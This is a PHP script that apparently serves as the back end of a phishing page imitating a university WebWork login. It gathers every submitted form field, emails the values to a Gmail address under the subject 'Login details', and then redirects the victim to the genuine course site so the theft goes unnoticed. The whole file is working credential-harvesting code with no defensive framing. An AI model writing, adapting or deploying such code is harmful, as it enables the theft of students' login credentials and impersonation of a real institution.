<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $to = 'webwork.org@gmail.com'; // Replace with your own email address
    $subject = 'Login details'; // Replace with your own subject line

    $message = '';
    foreach ($_POST as $key => $value) {
        $message .= $key . ": " . $value . "\n";
    }

    // Use mail() function to send email
    mail($to, $subject, $message);

    // Redirect user to a different page after form submission
    header('Location:https://webwork.ucd.ie/webwork2/Math-10260-Greferath/');
    exit;
}
?>
